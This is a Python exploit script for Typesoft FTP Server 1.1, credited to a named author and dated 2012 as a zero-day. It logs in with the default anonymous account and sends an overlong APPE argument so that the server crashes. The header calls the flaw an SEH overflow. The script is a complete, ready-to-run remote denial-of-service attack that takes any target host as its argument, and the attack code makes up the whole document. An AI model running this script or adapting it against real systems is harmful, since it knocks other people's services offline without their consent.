#!/usr/bin/python
###############################################################################
# SEH overflow exploiting a vulnerability in Typesoft-FTP APPE command.
# Date of Discovery: 3/16/2012 (0 Day)
# Author: Brock Haun
# Vulnerable Software Download: http://sourceforge.net/projects/ftpserv/
# Software Version: 1.1
# Target OS: Windows 7
# REQUIRES VALID CREDENTIALS. Luckily, anonymous logins are enabled by default. 
###############################################################################

import socket, sys

if len(sys.argv)!= 2:
     print '\n\t[*] Usage: ./' + sys.argv[0] + ' <target host>'
     sys.exit(1)

print '\n\t[*] TypesoftFTP Server 1.1 Remote DoS (APPE) by Brock Haun'

host = sys.argv[1]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


buffer = 'A../' + '\x41' *100 

print '\n\t[*] Sending crash buffer ("A../ + \x41 * 100").'

s.connect((host,21))

data = s.recv(1024)

s.send('USER anonymous' + '\r\n')

data = s.recv(1024)

s.send('PASS anonymous' + '\r\n')

data = s.recv(1024)

s.send('APPE ' + buffer + '\r\n')

print '\n\t[*] Done! Target should be unresponsive!'

s.close()